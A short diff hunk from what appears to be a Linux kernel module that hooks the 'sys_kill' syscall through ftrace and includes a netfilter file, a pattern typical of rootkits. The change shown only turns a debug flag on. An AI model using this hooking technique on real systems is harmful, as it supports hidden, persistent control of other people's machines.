@@ -2,7 +2,7 @@
 #include "kill.c"
 #include "netfilter.c"
 
-int debug=0;
+int debug=1;
 static struct ftrace_hook hooks[] = {
         HOOK("sys_kill", hook_kill, &orig_kill),
 };
